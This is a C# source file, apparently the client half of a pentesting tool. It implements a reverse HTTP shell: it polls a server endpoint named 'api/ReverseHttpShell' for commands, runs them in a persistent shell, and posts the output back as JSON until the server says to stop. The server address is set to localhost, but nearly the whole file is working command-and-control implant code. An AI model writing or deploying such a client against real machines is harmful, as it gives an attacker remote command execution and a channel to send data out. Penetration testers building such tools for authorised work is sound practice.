using Newtonsoft.Json;
using PentestingCommon;
using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PentestingClient
{
    class Program
    {
        public static bool KeepAlive { get; set; } = true;
        public static PersistentShell Shell { get; set; }
        public static string EndPoint { get; set; } = "api/ReverseHttpShell";
        public static string BaseAddress { get; set; } = "https://localhost:44349/";
        public static int Id { get; set; } = 0; // todo: should get this from server

        static async Task Main(string[] args)
        {
            // create shell
            Shell = new PersistentShell();

            // start recieving commands
            RecieveCommands();
            // send output
            SendOutput();
            // wait until supposed to close
            await ShouldClose();
        }

        private static async Task ShouldClose()
        {
            while (KeepAlive)
            {
                await Task.Delay(5_000);

                // create http client
                using var client = new HttpClient();

                // see if shell should stay alive
                var responseStr = await client.GetStringAsync($"{BaseAddress}{EndPoint}/{Id}");
                KeepAlive = bool.Parse(responseStr);
            }
        }

        /// <summary>
        /// Sends the output of the commands that are executed in the <seealso cref="Shell"/> 
        /// to <seealso cref="BaseAddress"/> <seealso cref="EndPoint"/>.
        /// </summary>
        private static async void SendOutput()
        {
            while (KeepAlive)
            {
                // wait for shell output
                var output = await Shell.WaitForShellOutput();

                // if output isn't null or empty
                if (!string.IsNullOrEmpty(output))
                {
                    // clear current output
                    Shell.CurrentOutput.Clear();

                    // create standard output object
                    var outputObj = new StandardOutputObject
                    {
                        Id = Id,
                        Output = output
                    };
                    // create json
                    var json = JsonConvert.SerializeObject(outputObj);
                    // create string content object
                    var data = new StringContent(json, Encoding.UTF8, "application/json");
                    // create http client
                    using var client = new HttpClient();

                    // post data
                    var response = await client.PostAsync(BaseAddress + EndPoint, data);
                }
            }
        }

        /// <summary>
        /// Recieve commands from <seealso cref="BaseAddress"/> <seealso cref="EndPoint"/> asynchronously.
        /// </summary>
        private static async void RecieveCommands()
        {
            while (KeepAlive)
            {
                await Task.Delay(10);

                // create http client
                using var client = new HttpClient();
                var responseStr = await client.GetStringAsync($"{BaseAddress}{EndPoint}/{Id}/{false}");
                // if response isn't null or empty write command to shell
                if (!string.IsNullOrEmpty(responseStr))
                {
                    Shell.Write(new StandardInputObject { Id = Id, Input = responseStr });
                }
            }
        }
    }
}
